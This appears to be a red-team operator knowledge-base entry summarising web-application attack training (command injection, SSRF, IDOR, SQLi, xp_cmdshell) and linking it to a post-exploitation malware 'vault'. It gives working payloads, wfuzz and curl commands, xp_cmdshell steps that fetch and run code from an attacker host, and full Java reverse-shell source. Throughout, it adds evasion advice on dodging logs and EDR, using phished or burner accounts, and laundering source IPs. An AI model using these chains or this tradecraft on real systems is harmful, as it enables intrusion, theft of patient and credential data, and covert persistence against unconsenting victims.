---
id: RTO-webapp-attack-surface
name: Web Application Attack Surface (Command Injection, SSRF, IDOR, Auth Bypass, RCE)
source: Red Team Ops / Zero-Point Security (OSWA / WEB-200)
category: initial-access
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T023, T021, T020, T019, T017, T007]
tags: [command-injection, ssrf, idor, sqli, directory-traversal, xp_cmdshell, java-reverse-shell, wfuzz, burp-suite, initial-access, webapp, mssql, spring-boot]
---

# Web Application Attack Surface — Training Reference

## TL;DR
This training chunk consolidates four WEB-200 modules — Command Injection, SSRF, IDOR, and the "Assembling the Pieces" capstone — plus an OpenEMR IDOR case study and a Group-Office SSRF case study. It is the initial-access / foothold phase that precedes the post-exploitation tradecraft in the vault: it teaches you how to get code execution on a remote Windows/Linux host through web-app vulnerabilities (command separators, `file://`/`gopher://` scheme abuse, IDOR iteration, directory traversal → config leak → stacked-query SQLi → `xp_cmdshell` → Java reverse shell). An operator should care because every chain in the vault (T007 injection, T016 EDR evasion, T017 persistence) assumes you already have a session on the target — this module is how you get it.

## Key Concepts

1. **Command injection via parameter manipulation**
   Web apps that shell out (ping, nslookup, image converters) and concatenate user input into the OS command line can be hijacked with command separators (`;`, `|`, `&&`, `||`, `` ` `` `$(...)`). The ONA case study uses `;id` appended to a POST `ip` parameter. No vault equivalent — vault assumes initial access already obtained.

2. **SSRF as a server-side proxy primitive**
   The forged request originates from the vulnerable server, not the attacker. This bypasses IP-based ACLs, reaches loopback-only services (Burp on `127.0.0.1:8080`, DBs, SSH on loopback), and traverses flat-network microservices behind an API gateway. Related conceptually to T019 dead-drop (out-of-band resource fetch) but at the web-app layer.

3. **Basic vs Blind SSRF**
   Basic SSRF renders the response body inline (SSRF Sandbox "Preview Link"). Blind SSRF only returns a status ("URL verified") — requires OOB verification via attacker-controlled listener + Apache `access.log` inspection. The `User-Agent` header leaks the underlying HTTP client (`python-requests/2.26.0`, `Group-Office HttpClient 6.5.77 (curl)`), which dictates which URL schemes are exploitable.

4. **URL scheme abuse: `file://`, `gopher://`**
   Scheme support is user-agent-dependent. Python `requests` rejects `file://`; `curl` honors it (`file:///etc/passwd` works). `gopher://` allows newline injection in the path, enabling protocol smuggling — fake HTTP requests with arbitrary method/headers over a single TCP socket. The first byte of the gopher path is consumed by the protocol (use `_GET` to drop the underscore).

5. **Double-encoding through nested request layers**
   When the SSRF target URL is itself URL-decoded by the application (browser → Burp → app → internal curl), `%20` becomes `%2520`. Replicating in Repeater or curl requires manual double-encoding of non-alphanumerics.

6. **IDOR variants**
   - Static file IDOR: `?f=1.txt` → `?f=2.txt` (increment filename).
   - ID-based DB IDOR: `?custId=1` → `?custId=2`.
   - UID/route IDOR: 5-digit UIDs (`?uid=16327`), ExpressJS routes (`/users/:userIdent/documents/:pdfFile`).
   Longer/UUID identifiers raise brute-force cost; seclists `5-digits-00000-99999.txt` covers 100k combinations in ~12 minutes with Wfuzz.

7. **Authenticated vs unauthenticated fuzzing**
   Erroneous-response-size baseline differs by auth state. Always capture a logged-out (`curl -s … -w '%{size_download}'`) AND logged-in baseline (`--header "Cookie: PHPSESSID=…"`) before Wfuzz, then filter both (`--hc 404 --hh 2873`).

8. **Burp Suite engagement workflow**
   `Intercept` → `Send to Repeater` for surgical re-issue; `Target → Site Map` reconstructs the app topology from proxied traffic; `Scope` + `Filter → Show only in-scope items` declutters HTTP history while still capturing OOS requests for later inspection.

9. **Wfuzz multi-payload iterators**
   `-w fileA -w fileB -m zip` pairs payloads index-by-index (cartesian would explode). Use `zip` when table-name and email-value should match (`insert into FUZZ values('FUZ2Z')`). Use default cartesian when fuzzing two independent axes (paths × files = 28 requests).

10. **Directory traversal → config leak → pivot to auth bypass**
    Spring Boot loads `application.properties`/`application.yml` from `./config/`, `.`, `classpath:/config/`, `classpath:/`. Wfuzz the four filenames against seven `../` traversal depths; one combination (`../config/application.properties`) leaks the DB connection string AND the `admin.portal.key` UUID used for API-key login. Mirrors the vault's T021 build-time `.env` embedding — same file, opposite direction.

11. **Stacked-query SQLi verification pattern**
    Add a single quote (`id=4'`); a 500 = syntax error = injectable. Stacked queries work on MSSQL/PostgreSQL but not MySQL by default. Verify by injecting `INSERT INTO <guess>(email) VALUES ('<table_name>')` and reading back the table name from the rendered admin page — blind exfil via application display surface.

12. **MSSQL `xp_cmdshell` RCE chain**
    `EXEC sp_configure 'show advanced options',1; RECONFIGURE;` → `EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;` → `EXEC xp_cmdshell 'curl http://attacker:8000/itworked';`. Works because the Spring datasource connects as `sa`. Each statement must be URL-encoded (spaces → `+` or `%20`) when delivered via query string.

13. **Java reverse shell staging**
    Windows Server lacks `nc`; Windows Defender flags uploaded `nc.exe`. Instead, host a `.java` source file on a Python HTTP server, fetch via `xp_cmdshell 'curl … --output %temp%/RevShell.java'`, then execute with `java %temp%/RevShell.java` (Java 11+ runs single-file source without explicit `javac`). The shell uses `ProcessBuilder("cmd.exe").redirectErrorStream(true)` + `Socket` I/O bridging.

14. **Enumeration discipline**
    Quick `nmap` (top 1000 ports) first for actionable coverage; `sudo nmap -O -Pn` in background for OS fingerprinting. `gobuster dir -w common.txt` for content discovery; reconcile 405s against observed POST endpoints; reconcile 400s against browser-observed query strings (Burp Site Map). The Spring Boot "Whitelabel Error Page" string is a passive fingerprint for the framework.

## Operational Techniques

### Command Injection (OpenNetAdmin case study)
- **What**: Append OS command separators to a user-controlled parameter that is concatenated into a shell command.
- **When to use**: Web app exposes "network utility" features (ping, DNS lookup, traceroute) or accepts IPs/hostnames that are eventually passed to a system call.
- **How**:
  1. Browse to the ONA `Ping` tool, click "Ping to verify".
  2. Enable Burp `Intercept` → click Ping again → `Forward` past the initial xajax request.
  3. Capture the second POST containing `xajaxargs[]=ip=>172.24.0.2`.
  4. Right-click → `Send to Repeater`.
  5. Modify the `ip` value to `172.24.0.2;id` (URL-encode the `;` as `%3B` if the framework doesn't auto-decode).
  6. Send — `id` output appears in the response → RCE confirmed.
- **Vault link**: No vault equivalent. The vault's T007 process injection and T023 client capabilities assume RCE has already been achieved; this is the upstream initial-access primitive.
- **Tool/code**:
  ```
  POST data:
  xajax=window_submit&xajaxr=1632763728103&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E172.24.0.2;id&xajaxargs[]=ping
  ```
- **OPSEC**: Web server logs every request with attacker IP + payload in cleartext. POST body may be logged by reverse proxies/WAF. Use a privacy proxy or pivot through SSRF if possible. Expect the `;` payload to trip naive WAF rules — try `|`, `&&`, `` `id` ``, `$(id)` as alternates.

### SSRF via `file://` scheme
- **What**: Force a server-side HTTP client that honors the `file` scheme to read arbitrary local files.
- **When to use**: SSRF sink identified and the user-agent is `curl` (Python `requests`, `urllib3`, `httpx` reject `file://`).
- **How**:
  1. Identify the SSRF sink (`Preview Link` page, RSS `feed` param, profile-picture `url` param).
  2. Submit `file:///etc/passwd` (Linux) or `file:///c:/windows/win.ini` (Windows).
  3. If the user-agent is `python-requests` and you get a generic error, switch the utility field to `curl` if the app offers it.
  4. Read the response body — file contents are inlined.
- **Vault link**: Conceptually related to T021 build-time `.env` embedding — both sides of the same coin (operator hides config in `.env`; attacker extracts it via SSRF). No execution overlap.
- **Tool/code**:
  ```
  GET /preview? utility=curl&url=file:///etc/passwd
  ```
- **OPSEC**: File reads against `/etc/passwd` are noisy in audit logs on hardened Linux; prefer `/etc/hostname`, `/proc/self/environ`, or app-specific config files. On Windows, `C:\windows\win.ini` is benign-looking; `C:\inetpub\wwwroot\web.config` is the actual target.

### SSRF via `gopher://` protocol smuggling
- **What**: Abuse gopher's tolerance for newlines in URL paths to forge arbitrary protocol requests through a single TCP socket.
- **When to use**: Basic SSRF only emits GET; you need POST/PUT or arbitrary bytes to an internal service (Redis, Memcached, internal HTTP API, SMTP).
- **How**:
  1. Start a netcat listener: `nc -nvlp 9000`.
  2. Probe gopher handling: `curl gopher://127.0.0.1:9000/hello_gopher` — note first byte (`h`) is consumed; listener sees `ello_gopher`.
  3. Prefix payload with a sacrificial char: `gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1`.
  4. For HTTP smuggling through the app: `gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0a` — the `%0a` terminates the request line; the server interprets the gopher path as a raw HTTP request.
  5. **Critical**: when sending through a browser/Burp, the browser URL-encodes the `%` → resulting in `%2520` (double-encoded). The app decodes once (→ `%20`), then the SSRF target decodes again (→ space). Replicate from Repeater/curl by manually double-encoding.
- **Vault link**: No direct vault equivalent. T022 network suite (SOCKS5, peer relay) operates at the transport layer for already-compromised hosts; gopher smuggling is pre-compromise SSRF abuse.
- **Tool/code**:
  ```
  gopher://127.0.0.1:80/_POST%20/status%20HTTP/1.1%0aHost:%20localhost%0a%0a
  ```
- **OPSEC**: Gopher traffic is exotic — internal IDS/Zeek will flag any `:70` connection or gopher-scheme string in HTTP logs. Use it once to land the real payload, then revert to normal HTTP.

### SSRF blind-exfil chain (Group-Office upload→download)
- **What**: When the SSRF sink returns no body (e.g., profile-picture upload that requires image metadata), chain it with a second endpoint that returns the stored blob by ID.
- **When to use**: SSRF confirmed (Apache log shows the forged request) but the sink refuses to render non-image content (HTTP 500 from `/api/thumb.php`).
- **How**:
  1. Submit `file:///etc/passwd` to the SSRF sink (`POST /api/upload.php` with `url=file:///etc/passwd`).
  2. Note the `blobId` in the JSON response.
  3. Issue `GET /api/download.php?blob=<blobId>` (or any pre-existing `/api/thumb.php?blob=…`-style endpoint).
  4. The blob storage doesn't validate content-type on download — file contents returned.
- **Vault link**: No vault equivalent; this is an application-layer chaining pattern not represented in the syscall/injection focus.
- **Tool/code**:
  ```
  POST /api/upload.php  Body: url=file:///etc/passwd  → {"blobId":"abc123"}
  GET  /api/download.php?blob=abc123                  → file contents
  ```
- **OPSEC**: The `blobId` is logged against the user account; tie it to a low-priv or shared account if possible. The two requests are temporally adjacent in app logs — pattern-able.

### Static file IDOR iteration
- **What**: Increment a filename or numeric suffix in a query parameter to read adjacent files belonging to other users.
- **When to use**: URL contains `?f=`, `?file=`, `?doc=`, `?path=` with numeric or sequential string values.
- **How**:
  1. Visit `http://target/docs/?f=1.txt` — observe content.
  2. Increment to `?f=2.txt` — different content confirms IDOR.
  3. Script with `curl` or `ffuf` to walk the range.
- **Vault link**: No equivalent; vault focuses on Win32 post-exploit.
- **Tool/code**:
  ```
  for i in $(seq 1 100); do curl -s "http://target/docs/?f=${i}.txt"; done
  ```
- **OPSEC**: Each request is logged with sequential IPs/timestamps — extremely obvious in app logs. Space requests over time and rotate through different parameters if multiple IDOR sinks exist.

### UID brute force (authenticated, with session cookie)
- **What**: Fuzz a 5-digit UID parameter against an authenticated endpoint to enumerate users not visible in the UI.
- **When to use**: IDOR sink found but identifier space is too large to walk sequentially (5-digit = 100k).
- **How**:
  1. Log in as a known user → capture `PHPSESSID` via Burp Intercept.
  2. Establish baseline sizes:
     - Unauthenticated erroneous response: `curl -s http://idor-sandbox/user/?uid=62718 -w '%{size_download}'` → `0`
     - Authenticated erroneous response: `curl -s http://idor-sandbox/user/?uid=91191 -w '%{size_download}' --header "Cookie: PHPSESSID=2a19…"` → `2873`
  3. Run Wfuzz with the seclists wordlist, filtering both status code and response size:
     ```
     wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt \
       --hc 404 --hh 2873 \
       -H "Cookie: PHPSESSID=2a19139a5af3b1e99dd277cfee87bd64" \
       http://idor-sandbox:80/user/?uid=FUZZ
     ```
  4. ~10 valid UIDs surface; visit each to exfil Name/Handle/Location/Member Status.
- **Vault link**: No equivalent. T023 byakugan does TCP/ARP/AD recon — different layer.
- **Tool/code**: see above.
- **OPSEC**: 100k requests in ~12 minutes from one IP is trivially detectable. Rate-limit (~1 req/sec) or distribute across IPs/proxies. The 2873-byte filter is brittle — slight app changes invalidate it.

### IDOR `noteid` iteration (OpenEMR CVE-2021-40352)
- **What**: Walk a `noteid` parameter to read messages between doctors and patients.
- **When to use**: Low-priv authenticated access to a message/PDF/print endpoint with sequential integer IDs.
- **How**:
  1. Log in as low-priv user (`lowpriv` / `Password1!`).
  2. Browse to Message Center → click on a message → enable Burp Intercept → click "Print Message".
  3. Send the intercepted request to Repeater → observe `noteid=11` in URL.
  4. Decrement/increment `noteid` to read other users' messages (some reveal private IPs, patient data, etc.).
- **Vault link**: No direct equivalent. T023 client capabilities includes credential harvest — this is the upstream web-app-side data discovery.
- **Tool/code**:
  ```
  GET /interface/patient/print_message.php?noteid=10
  ```
- **OPSEC**: High — patient data access is a HIPAA-style critical event; logs will flag the user account. Use a burner account or one tied to a phished user.

### Directory traversal → Spring Boot config leak
- **What**: Walk `../` depths × candidate config filenames to extract `application.properties`.
- **When to use**: App takes a file-path parameter and the framework is Spring Boot (Whitelabel Error Page) or any framework with known config-file locations.
- **How**:
  1. Identify sink: `GET /specials?menu=winter.html` → empty 200 for nonexistent files.
  2. Test traversal: `?menu=../../../../../../../windows/win.ini` → file contents confirm vuln.
  3. Build two wordlists:
     - `paths.txt`: `../` through `../../../../../../../` (7 lines).
     - `files.txt`: `application.properties`, `application.yml`, `config/application.properties`, `config/application.yml` (4 lines).
  4. Wfuzz cartesian product:
     ```
     wfuzz -w paths.txt -w files.txt --hh 0 \
       "http://asio/specials?menu=FUZZFUZ2Z"
     ```
  5. One hit: `../config/application.properties` returns Spring Boot config with DB creds + `admin.portal.key=06c82a1f-892d-48de-8682-67c0c3a096b4`.
  6. Use the API key on `/login` → admin access.
- **Vault link**: T021 build-time `.env` embedding (`src/config.rs`, `build.rs`) — same file format, opposite operator. Operators using the vault should treat `application.properties` as a target, not a source.
- **Tool/code**: see above.
- **OPSEC**: The 28 traversal requests are pattern-obvious but very fast (sub-second). Config file in proxy logs is a red flag — exfil via a chained SSRF if possible to launder the source IP.

### Stacked-query SQLi verification via INSERT
- **What**: Confirm stacked-query support by injecting an `INSERT` that writes the candidate table name into the rendered admin page.
- **When to use**: SQLi sink found in a `DELETE`/`UPDATE` statement where UNION exfil doesn't display results; DB driver is MSSQL or PostgreSQL.
- **How**:
  1. Send `id=4` → 302 (baseline).
  2. Send `id=4'` → 500 (syntax error confirms injection).
  3. Send `id=4;SELECT+@@VERSION;` → 302 (no error, but unverifiable).
  4. Build candidate wordlist `tables.txt`:
     ```
     newsletter, newsletters, subscription, subscriptions,
     newsletter_subscription, newsletter_subscriptions
     ```
  5. Fuzz with `zip` iterator (same value in both slots):
     ```
     wfuzz -w tables.txt -w tables.txt -m zip \
       -b JSESSIONID=C0C3B7B39FB409EC20E31AF0B715C801 -d "" \
       "http://asio/admin/message/delete?id=4;insert+into+FUZZ+values('FUZ2Z')"
     ```
  6. Refresh admin page → "subscriptions" appears as a new newsletter entry → table name confirmed.
- **Vault link**: No vault equivalent; vault assumes post-exploit, not web injection.
- **Tool/code**: see above.
- **OPSEC**: INSERTs mutate state — every successful fuzz run leaves a row. Use a unique marker (the table name itself) so you can identify and clean up. The `JSESSIONID` rotation on session expiry breaks automation — script the re-auth.

### MSSQL `xp_cmdshell` RCE chain
- **What**: Enable `xp_cmdshell` via stacked queries on an `sa`-connected SQL Server, then shell out from the DB context.
- **When to use**: Confirmed stacked-query SQLi against MSSQL with `sa` privileges (verify via `SELECT SYSTEM_USER` exfil).
- **How**:
  1. Enable advanced options:
     ```
     id=4;EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;
     ```
  2. Enable xp_cmdshell:
     ```
     id=4;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;
     ```
  3. Verify with a callback:
     ```
     nc -nvlp 8000
     id=4;EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/itworked';
     ```
  4. Confirm the curl request hits netcat → RCE verified.
- **Vault link**: Bridges into T007 process injection territory — once `xp_cmdshell` lands, the next step (downloading the dark_crystal loader / executing the client_rust RAT) is where the vault takes over. The Java reverse shell below is the staging step before vault tradecraft applies.
- **Tool/code**: see above.
- **OPSEC**: `xp_cmdshell` enablement is audited in MSSQL error log and Windows Event Log (if SQL audit is configured). The `curl` callback leaves a process-tree trace (`sqlservr.exe → cmd.exe → curl.exe`). Modern EDR (CrowdStrike, SentinelOne) will alert on this lineage. Consider direct `xp_cmdshell 'powershell -enc <b64>'` for cleaner tradecraft.

### Java reverse shell staging via Python HTTP server
- **What**: Host a single-file `.java` reverse shell, download via `xp_cmdshell curl`, execute with `java` (Java 11+ runs source files directly).
- **When to use**: RCE on Windows via `xp_cmdshell`; `nc.exe` is unavailable/AV-flagged; Java runtime is present (Spring Boot target guarantees it).
- **How**:
  1. Start Python HTTP server: `python3 -m http.server 8000`.
  2. Create `RevShell.java`:
     ```java
     import java.io.IOException;
     import java.io.InputStream;
     import java.io.OutputStream;
     import java.net.Socket;
     class RevShell {
         public static void main(String[] args) throws Exception {
             String host = "192.168.48.2";
             int port = 4444;
             String cmd = "cmd.exe";
             Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
             Socket s = new Socket(host, port);
             InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
             OutputStream po = p.getOutputStream(), so = s.getOutputStream();
             while (!s.isClosed()) {
                 while (pi.available() > 0) so.write(pi.read());
                 while (pe.available() > 0) so.write(pe.read());
                 while (si.available() > 0) po.write(si.read());
                 so.flush(); po.flush(); Thread.sleep(50);
                 try { p.exitValue(); break; } catch (Exception e) {}
             }
             p.destroy(); s.close();
         }
     }
     ```
     Note: `throws Exception` on `main` is mandatory — `ProcessBuilder.start()` and `Socket` ctor throw `IOException`.
  3. Download via SQLi payload (URL-encode spaces and `%`):
     ```
     EXEC+xp_cmdshell+'curl+http://192.168.48.2:8000/RevShell.java+--output+%temp%/RevShell.java';
     ```
  4. Start netcat: `nc -nvlp 4444`.
  5. Execute:
     ```
     EXEC+xp_cmdshell+'java+%temp%/RevShell.java';
     ```
  6. Netcat receives `Microsoft Windows [Version 10.0.17763.2366]` banner → shell obtained.
- **Vault link**: Strong conceptual bridge to T007 (process injection) — at this point the operator would stage the dark_crystal loader (`dark_crystal/crates/core/src/main.rs`) via the Java shell, then transition to vault injection techniques (T007 Pool Party, T012 Early Cascade, T009 Process Ghosting) to migrate into a stable process. T020 anti-analysis (`evade_vm.rs`, `iat_camo.rs`) would gate further action.
- **Tool/code**: see Java source above.
- **OPSEC**: `java.exe` spawning `cmd.exe` is a process-tree oddity that EDR will flag. The shell exits when the parent JVM exits — re-parent or migrate quickly. The `--output` curl writes a `.java` file to `%temp%` — file-write artifacts in EDR telemetry. Alternative: inline the entire Java source as a single `xp_cmdshell 'java -e "…"'` (Java 11+ supports source via stdin).

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `nmap <host>` | Top-1000 TCP port sweep | Connect/sYN visible to IDS; -Pn disables ping (more stealth, slower) |
| `sudo nmap -O -Pn <host>` | OS fingerprint | OSScan results unreliable with <2 ports; warning printed |
| `gobuster dir -u http://host -w common.txt` | Content discovery | 10 threads default; gobuster/3.1.0 UA easily detected |
| `wfuzz -c -z file,<wl> --hc <code> --hh <bytes> -H "Cookie: …" <URL>?FUZZ` | Single-payload fuzzing | 100k reqs ~12min; logged with attacker IP |
| `wfuzz -w <A> -w <B> -m zip` | Zip-iterator paired payloads | Same payload index in both slots |
| `wfuzz -w <A> -w <B> -m …` (no `-m`) | Cartesian iterator (default) | N×M requests, exponential blow-up risk |
| `curl -s <URL> -w '%{size_download}'` | Silent response + size only | Useful for baseline establishment |
| `curl --header "Cookie: …"` | Authenticated request | Session rotation invalidates; script re-auth |
| `curl gopher://127.0.0.1:9000/_<payload>` | Gopher protocol smuggling | First path byte consumed; IDS flags :70/gopher scheme |
| `python3 -m http.server 8000` | Staging HTTP server | Logs source IP + UA of every fetch; visible to target |
| `nc -nvlp <port>` | Reverse shell / OOB callback listener | Listener visible in netstat; bind to 0.0.0.0 for external targets |
| `javac RevShell.java` | Compile Java source (optional — Java 11+ runs `.java` directly) | Class file artifacts on disk |
| `java %temp%/RevShell.java` | Run single-file Java source | Java 11+ JEP 330 feature; spawns JVM process tree |
| `tail /var/log/apache2/access.log` | OOB callback verification | Useful on attacker-controlled secondary |
| `/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt` | 100k UID wordlist | SecLists package |
| `/usr/share/wordlists/dirb/common.txt` | Common directory names | ~4k entries, default dirb wordlist |
| `sudo systemctl restart apache2` | Restart Apache for log freshness | Notable on operator box only |
| `Burp Suite → Intercept → Send to Repeater` | Surgical request re-issue | Repeater requests also appear in target logs |
| `Burp Suite → Target → Site Map` | Topology reconstruction from proxied traffic | All traffic still hits target; this is analysis-side only |
| `Burp Suite → Scope → Show only in-scope items` | Declutter HTTP history | Does NOT block OOS requests, just hides them |
| `EXECUTE sp_configure 'show advanced options',1; RECONFIGURE;` | Enable MSSQL advanced options | Audited in `sys.configurations` and SQL error log |
| `EXECUTE sp_configure 'xp_cmdshell',1; RECONFIGURE;` | Enable xp_cmdshell | Same; surface area configuration change |
| `EXEC xp_cmdshell '<cmd>'` | Spawn cmd.exe from SQL Server | cmd.exe child of sqlservr.exe — anomalous lineage |

## Gaps & Extensions

### What the vault covers that this training does NOT
- **Post-exploitation tradecraft**: The vault's entire T007 process injection suite (15 methods), T016 EDR evasion (13 techniques), T017 persistence (5 layers), T018 BYOVD, T019 Edo Tensei resurrection, T020 anti-analysis, T021 crypto/obfuscation — none of this is touched by WEB-200. The training ends at "you have a reverse shell"; the vault picks up at "now make that shell permanent, hidden, and resilient."
- **Windows API / syscall discipline**: T001 RecycledGate, T002 Hell's/Halo's/Tartarus Gate, T003 VEH Gate, T004 PEB Walker, T006 Phantom Stubs — the entire syscall-resolution cascade is absent from WEB-200, which treats `xp_cmdshell` as the RCE endpoint rather than the post-exploit defensive-evasion layer.
- **Sleep obfuscation (T005 Ekko ROP)**: WEB-200 has no concept of in-memory dwell-time hardening.
- **Rust FFI patterns / cargo features**: The vault's compile-time footprint management is absent.
- **HVNC / VNC / SOCKS5 / peer-relay C2 (T022)**: WEB-200 has no post-exploitation networking primitives.

### What this training covers that the vault does NOT
- **Web-app attack surface mapping**: SSRF, IDOR, command injection, SQLi, directory traversal, XXE, SSTI — none of these primitives exist in the vault. An operator using the vault for Windows post-exploit has no internal reference for the initial-access phase.
- **Burp Suite / Wfuzz workflow**: The vault has no documentation of interception, Repeater, scope filtering, or multi-payload fuzzing iterators.
- **Spring Boot / Java fingerprinting and exploitation**: Vault is Rust-only; the Java reverse shell tradecraft (single-file `java` execution via JEP 330, `throws Exception` declaration for `IOException`) is novel.
- **MSSQL `xp_cmdshell` enablement chain**: Not in the vault, which assumes DB access is already compromised or out of scope.
- **OOB verification patterns via Apache `access.log` + `User-Agent`**: The vault's T019 dead-drop uses rentry.co + Sepolia blockchain for autonomous C2 — same out-of-band verification concept but at the post-exploit phase, whereas this training uses Apache logs at the initial-access phase.
- **SecLists wordlist curation**: `Fuzzing/5-digits-00000-99999.txt`, `dirb/common.txt` — no equivalent cataloging in the vault.
- **Double-encoding through nested application layers**: A subtle but operationally critical pattern not represented in the vault's syscall/syscall focus.

### Specific high-value additions to operator knowledge
1. **The "Assembling the Pieces" capstone** is the canonical chain pattern: enumeration → directory traversal → config leak → auth bypass → SQLi → `xp_cmdshell` → reverse shell. This is the model initial-access chain that vault operators should internalize before pivoting to T007+ tradecraft.
2. **The `xp_cmdshell` → `curl` → Java shell** staging pattern is operationally superior to uploading `nc.exe` because it sidesteps AV signatures on netcat binaries and leverages the existing JVM on Spring Boot targets.
3. **Wfuzz `zip` iterator** is essential for table-name/parameter-name fuzzing where both slots should hold the same value — not obvious from the docs.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| Java reverse shell via `xp_cmdshell` + `curl` + `java` | T023 (client capabilities: `src/main.rs`, `src/input.rs`) | Vault assumes shell already obtained; training shows initial access. Bridge: stage `dark_crystal` loader via Java shell, then transition to T007 injection. |
| `xp_cmdshell` RCE on MSSQL | T023 (no direct equiv) | Vault has no DB exploitation primitive; this is upstream initial access. |
| HTTP staging server (`python3 -m http.server`) | T020 (`winhttp_dl.rs`: WinHTTP staged download) | Inverse: vault uses WinHTTP to fetch post-exploit payload; training uses Python HTTP server + curl to land the initial shell. |
| Spring Boot `application.properties` config leak | T021 (`src/config.rs`, `build.rs`: build-time `.env` embedding) | Same file format, opposite direction. Operator embeds config; attacker extracts via traversal. |
| Network recon (`nmap`, `gobuster`, `wfuzz`) | T023 (`src/byakugan.rs`: ARP, TCP, AD enum) | Different layer — byakugan is post-exploit internal recon; nmap/gobuster is pre-exploit external recon. |
| Persistence via app config manipulation | T017 (`persist/` module: COM hijack, NTFS EA, schtask, TLS, PhantomPersist) | Different surface — T017 is Win32 persistence; app config manipulation is application-layer. |
| OOB verification via Apache `access.log` + `User-Agent` | T019 (`src/discovery.rs`: rentry.co + Sepolia contract; `src/eth_rpc.rs`) | Same out-of-band verification pattern, different transport (HTTP logs vs blockchain dead-drop). |
| UID brute force with SecLists wordlist | None | Vault has no web-app fuzzing primitive. |
| Stacked-query SQLi → INSERT table-name exfil | None | Vault has no SQLi primitive. |
| Gopher protocol smuggling | T022 (`src/kamui.rs`: SOCKS5; `src/juubi.rs`: peer relay) | Different layer — SOCKS5/peer relay are post-compromise transport; gopher smuggling is pre-compromise SSRF abuse. |
| Directory traversal to `application.properties` | T021 (build-time `.env`) | Inverse operation on the same config-file format. |
| Command injection via `;` separator | None | Vault assumes initial access; this is the initial-access primitive. |
| Double-encoding through nested request layers | T016 (`evasion/advanced_stack.rs`: multi-frame stack spoofing) | Conceptually similar — both deal with layered decoding/encoding — but at different layers (HTTP request vs call stack). |
| IDOR `noteid` iteration (OpenEMR) | T023 (credential harvest via `harvest/` module) | Upstream of vault's credential harvest — IDOR exfil is the discovery phase; vault harvest is the post-shell exfil phase. |
| Burp Suite `Send to Repeater` workflow | None | Vault is CLI/Rust-focused; no proxy-interception tradecraft documented. |
| Spring Boot Whitelabel Error Page fingerprint | T020 (`evade_vm.rs`: 10 anti-VM checks) | Different fingerprinting surface — anti-VM is host-level; Whitelabel is app-level. |
| Java 11+ JEP 330 single-file source execution | T007 (`executors/shellcode_execution/ntapi_shellcode/template.rs`) | Different runtime — JEP 330 is JVM-side shell staging; ntapi_shellcode is native execution. |
| `nc -nvlp` listener for OOB callback | T023 (`src/tcp_transport.rs`: TCP transport) | Listener pattern overlaps with vault's TCP transport but at different abstraction layer. |
| Wfuzz `zip` iterator for paired payloads | None | Vault has no fuzzer integration. |
| SecLists wordlist catalog | None | Vault has no wordlist references. |

This training chunk is the upstream initial-access counterpart to the vault's post-exploitation focus. An operator running a full engagement should sequence: WEB-200-style web-app attack → `xp_cmdshell`/Java-shell landing → dark_crystal loader execution → T007 process injection into stable host → T016 EDR evasion → T017 persistence → T022 C2 transport → T023 client capabilities for exfil/interaction.